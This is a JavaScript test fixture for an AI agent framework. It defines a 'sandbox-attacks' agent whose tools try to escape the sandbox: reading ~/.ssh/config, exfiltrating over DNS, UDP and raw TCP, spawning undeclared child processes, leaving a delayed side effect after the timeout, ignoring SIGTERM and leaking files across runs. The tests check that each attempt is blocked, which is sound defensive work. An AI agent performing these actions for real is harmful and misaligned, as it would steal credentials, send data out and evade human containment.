import { execFile, spawn } from "node:child_process";
import { resolve4 } from "node:dns/promises";
import { createSocket } from "node:dgram";
import { Socket } from "node:net";
import { readFile, writeFile } from "node:fs/promises";
import { homedir } from "node:os";
import { resolve } from "node:path";
import { promisify } from "node:util";
import { agent, auto, schema, tool } from "../../dist/index.js";
import { modularValue } from "../tool-modules/sandbox-tool-module.mjs";

const executeFile = promisify(execFile);

export default agent({
  id: "sandbox-attacks",
  instructions: "Run requested tool.",
  model: auto(),
  tools: [
    tool({
      name: "modular_read",
      description: "Read value from locked local tool module.",
      input: schema.object({}),
      effect: "read",
      async execute() {
        return modularValue();
      },
    }),
    tool({
      name: "noisy_stdout",
      description: "Write to stdout, then return a real result.",
      input: schema.object({}),
      effect: "read",
      async execute() {
        // Anything a tool (or its import graph) prints to stdout used to collide
        // with the result channel and corrupt it; the result now rides fd 3.
        console.log("this is unstructured stdout noise {not: json}");
        process.stdout.write("more noise without a newline");
        return { ok: "structured-result" };
      },
    }),
    tool({
      name: "late_reject",
      description: "Return a value, then float an unhandled rejection.",
      input: schema.object({}),
      effect: "read",
      async execute() {
        // A floating rejection AFTER the result is written must not fail a tool
        // that already succeeded (the worker's handler ignores it once the
        // result is on fd 3). Without the handler, Node crashes the worker.
        setImmediate(() => { Promise.reject(new Error("late floating rejection")); });
        return { ok: "success-despite-late-reject" };
      },
    }),
    tool({
      name: "nonserializable_result",
      description: "Return a value JSON cannot encode.",
      input: schema.object({}),
      effect: "read",
      async execute() {
        return 1n;
      },
    }),
    tool({
      name: "home_read",
      description: "Attempt host-home read.",
      input: schema.object({}),
      effect: "read",
      async execute() {
        return readFile(`${homedir()}/.ssh/config`, "utf8");
      },
    }),
    tool({
      name: "network_read",
      description: "Attempt undeclared network.",
      input: schema.object({}),
      effect: "read",
      async execute() {
        return (await fetch("https://example.com")).status;
      },
    }),
    tool({
      name: "tcp_connect",
      description: "Attempt raw TCP egress via a net.Socket instance.",
      input: schema.object({}),
      effect: "read",
      // net.Socket().connect() bypasses installNetworkDeny's module-level
      // monkeypatch entirely (it patches net.connect, not Socket.prototype),
      // so being blocked here is evidence of the REAL OS network boundary, not
      // the defense-in-depth theater.
      async execute() {
        const socket = new Socket();
        await new Promise((accept, reject) => {
          socket.once("error", reject);
          socket.connect(53, "1.1.1.1", () => accept(undefined));
        });
        socket.destroy();
        return "connected";
      },
    }),
    tool({
      name: "dns_read",
      description: "Attempt DNS exfiltration.",
      input: schema.object({}),
      effect: "read",
      async execute() {
        return resolve4("secret.example.com");
      },
    }),
    tool({
      name: "udp_write",
      description: "Attempt UDP exfiltration.",
      input: schema.object({}),
      effect: "read",
      async execute() {
        const socket = createSocket("udp4");
        await new Promise((accept, reject) => {
          socket.once("error", reject);
          socket.send(Buffer.from("secret"), 53, "1.1.1.1", (error) => error ? reject(error) : accept());
        });
        socket.close();
        return "sent";
      },
    }),
    tool({
      name: "child_process",
      description: "Attempt undeclared child process.",
      input: schema.object({}),
      effect: "read",
      async execute() {
        return executeFile(process.execPath, ["--version"]);
      },
    }),
    tool({
      name: "delayed_child_effect",
      description: "Spawn delayed UDP side effect, then ignore timeout.",
      input: schema.object({ port: schema.integer() }),
      effect: "read",
      timeoutMs: 300,
      async execute({ port }) {
        process.on("SIGTERM", () => undefined);
        spawn(process.execPath, [
          "--input-type=module",
          "-e",
          [
            'import { createSocket } from "node:dgram";',
            "const port = Number(process.argv[1]);",
            "setTimeout(() => {",
            '  const socket = createSocket("udp4");',
            '  socket.send(Buffer.from("late-effect"), port, "127.0.0.1", () => socket.close());',
            "}, 900);",
          ].join("\n"),
          String(port),
        ], { stdio: "ignore" });
        await new Promise(() => undefined);
      },
    }),
    tool({
      name: "ignore_timeout",
      description: "Ignore SIGTERM and tool timeout.",
      input: schema.object({}),
      effect: "read",
      // Leave worker startup outside timing race so SIGTERM handler is active
      // before timeout proves SIGKILL escalation and close-wait behavior.
      timeoutMs: 1_000,
      async execute() {
        process.on("SIGTERM", () => undefined);
        setInterval(() => undefined, 1_000);
        await new Promise(() => undefined);
      },
    }),
    tool({
      name: "write_workspace",
      description: "Write ephemeral workspace marker.",
      input: schema.object({}),
      effect: "read",
      async execute() {
        await writeFile(resolve("cross-run-marker"), "leak");
        return "written";
      },
    }),
    tool({
      name: "live_write",
      description: "Explicit live-mode sandbox write.",
      input: schema.object({}),
      effect: "write",
      async execute() {
        await writeFile(resolve("live-write-marker"), "ok");
        return "live-write-ok";
      },
    }),
    tool({
      name: "read_workspace",
      description: "Read prior workspace marker.",
      input: schema.object({}),
      effect: "read",
      async execute() {
        return readFile(resolve("cross-run-marker"), "utf8");
      },
    }),
  ],
  sandbox: "required",
});
